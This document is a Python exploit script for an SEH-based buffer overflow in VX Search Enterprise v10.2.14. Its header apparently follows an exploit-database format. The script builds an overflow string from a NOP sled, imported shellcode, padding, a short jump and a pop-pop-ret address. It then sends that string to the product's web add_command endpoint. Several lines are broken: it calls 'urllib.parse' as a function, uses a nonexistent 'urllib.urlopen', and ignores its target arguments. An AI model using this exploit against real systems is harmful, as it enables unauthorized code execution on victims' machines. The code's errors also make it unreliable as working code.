#!/usr/bin/python




# Exploit Title     : VX Search Enterprise v10.2.14 Buffer Overflow (SEH)
# Discovery by      : W01fier00t
# Twitter           : @wolfieroot
# Discovery Date    : 22/11/2017
# Software Link     : http://www.vxsearch.com/setups/vxsearchent_setup_v10.2.14.exe
# Tested Version    : 10.2.14
# Tested on OS      : Windows 7 Home Edition sp1
# You will need to enable web server for this to work.
# You will also need the Login to VX Search wepage, for this to work.



import urllib.parse
import socket
import sys
import time
import socket
import struct
from payload import buf

import struct
def shell_attack(target_machine, target_port): 

#Bad chars \x00\x0a\x0d
#Payload size: 351 bytes
	

	#0x1001a136 : pop edi # pop esi # ret 0x04 |  {PAGE_EXECUTE_READ} [libspp.dll]
	cmdname = b"\x90" *16
	cmdname += buf
	cmdname += b"A" * 157
	cmdname += b"\xEB\x06"
	cmdname += b"B" *2
	cmdname += b"\x36\xa1\x01\x10"


	url = 'http://127.0.0.1/add_command?sid=f3fdf2603e9ac8f518db9452fee62110'
	values = {'command_name' : cmdname}
	data = urllib.parse.urlencode(values)
	req = urllib.parse(url, data)

	try:
		response = urllib.urlopen(req, timeout = 1)
	except socket.timeout:
		pass

	